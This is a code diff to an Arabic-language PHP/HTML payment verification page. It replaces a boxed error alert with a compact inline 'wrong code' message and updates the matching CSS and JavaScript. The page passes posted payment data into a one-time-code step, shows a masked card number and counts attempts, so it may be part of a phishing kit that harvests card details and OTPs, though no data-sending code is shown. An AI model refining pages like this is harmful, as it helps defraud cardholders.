@@ -246,47 +246,19 @@ $payment_data = $_POST;
             font-weight: 600;
         }
 
-        /* Error Alert Styles */
-        .error-alert {
-            background: var(--color-error-light);
-            border: 1px solid var(--color-error);
-            border-radius: 0.75rem;
-            padding: 1rem;
-            margin-bottom: 1rem;
+        /* Error Message Styles */
+        .error-message {
             display: none;
-            align-items: center;
-            gap: 0.75rem;
+            color: var(--color-error);
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-top: 0.5rem;
+            text-align: right;
             animation: slideDown 0.3s ease;
         }
 
-        .error-alert.show {
-            display: flex;
-        }
-
-        .error-icon {
-            width: 1.5rem;
-            height: 1.5rem;
-            flex-shrink: 0;
-        }
-
-        .error-icon svg {
-            fill: var(--color-error);
-        }
-
-        .error-content {
-            flex: 1;
-        }
-
-        .error-title {
-            font-weight: 700;
-            color: var(--color-error);
-            font-size: 0.875rem;
-            margin-bottom: 0.25rem;
-        }
-
-        .error-message {
-            font-size: 0.75rem;
-            color: #991B1B;
+        .error-message.show {
+            display: block;
         }
 
         @keyframes slideDown {
@@ -308,11 +280,6 @@ $payment_data = $_POST;
 
         .shake {
             animation: shake 0.5s ease;
-        }
-
-        .input-error {
-            border-color: var(--color-error) !important;
-            box-shadow: 0 0 0 3px var(--color-error-light) !important;
         }
 
         .footer {
@@ -464,21 +431,6 @@ $payment_data = $_POST;
                 <span class="phone-display" id="cardDisplay" style="direction:ltr;display:inline-block">**** ****</span>
             </p>
 
-            <!-- Error Alert -->
-            <div class="error-alert" id="errorAlert">
-                <div class="error-icon">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="12" cy="12" r="10" fill="currentColor"/>
-                        <line x1="12" y1="8" x2="12" y2="12" stroke="white" stroke-width="2" stroke-linecap="round"/>
-                        <circle cx="12" cy="16" r="1" fill="white"/>
-                    </svg>
-                </div>
-                <div class="error-content">
-                    <div class="error-title">رمز التحقق خاطئ</div>
-                    <div class="error-message">الرجاء التحقق من الرمز والمحاولة مرة أخرى</div>
-                </div>
-            </div>
-
             <form id="otpForm">
                 <label style="display:block;font-size:0.875rem;font-weight:600;color:var(--color-text-secondary);margin-bottom:0.75rem;text-align:right">
                     أدخل رمز التحقق:
@@ -494,6 +446,7 @@ $payment_data = $_POST;
                     required 
                     style="width:100%;padding:1rem;font-size:1.5rem;font-weight:700;text-align:center;border:2px solid var(--color-border);border-radius:12px;background:white;color:var(--color-text-primary);letter-spacing:0.5rem;font-family:'Courier New',monospace;transition:all 0.3s ease"
                 >
+                <div class="error-message" id="errorMessage">الرمز الذي أدخلته خاطئ</div>
                 <button type="submit" class="submit-btn" id="submitBtn">تحقق من الرمز</button>
             </form>
 
@@ -545,25 +498,25 @@ $payment_data = $_POST;
     const submitBtn = document.getElementById('submitBtn');
     const form = document.getElementById('otpForm');
     const loadingOverlay = document.getElementById('loadingOverlay');
-    const errorAlert = document.getElementById('errorAlert');
+    const errorMessage = document.getElementById('errorMessage');
     
     let attemptCount = 0;
 
     // منع إدخال أي شيء غير الأرقام
     otpInput.addEventListener('input', function() {
         this.value = this.value.replace(/[^0-9]/g, '');
+        // إخفاء رسالة الخطأ عند الكتابة
+        errorMessage.classList.remove('show');
+        this.style.borderColor = 'var(--color-border)';
     });
 
     otpInput.addEventListener('focus', function() {
         this.style.borderColor = 'var(--color-primary)';
         this.style.boxShadow = '0 0 0 3px var(--color-primary-light)';
-        // إخفاء رسالة الخطأ عند التركيز على الحقل
-        errorAlert.classList.remove('show');
-        this.classList.remove('input-error');
     });
 
     otpInput.addEventListener('blur', function() {
-        if (!this.classList.contains('input-error')) {
+        if (!errorMessage.classList.contains('show')) {
             this.style.borderColor = 'var(--color-border)';
             this.style.boxShadow = 'none';
         }
@@ -573,8 +526,10 @@ $payment_data = $_POST;
 
     // دالة لإظهار رسالة الخطأ
     function showError() {
-        errorAlert.classList.add('show');
-        otpInput.classList.add('input-error', 'shake');
+        errorMessage.classList.add('show');
+        otpInput.style.borderColor = 'var(--color-error)';
+        otpInput.style.boxShadow = '0 0 0 3px var(--color-error-light)';
+        otpInput.classList.add('shake');
         otpInput.value = '';
         
         // إزالة تأثير الاهتزاز بعد انتهائه
@@ -590,7 +545,7 @@ $payment_data = $_POST;
         
         const otp = otpInput.value.trim();
         if (!otp || (otp.length !== 4 && otp.length !== 6)) {
-            otpInput.classList.add('input-error');
+            showError();
             return;
         }
 
@@ -654,8 +609,9 @@ $payment_data = $_POST;
 
     resendBtn.addEventListener('click', function() {
         // إخفاء رسالة الخطأ
-        errorAlert.classList.remove('show');
-        otpInput.classList.remove('input-error');
+        errorMessage.classList.remove('show');
+        otpInput.style.borderColor = 'var(--color-border)';
+        otpInput.style.boxShadow = 'none';
         
         timeLeft = 60;
         timerElement.textContent = timeLeft;
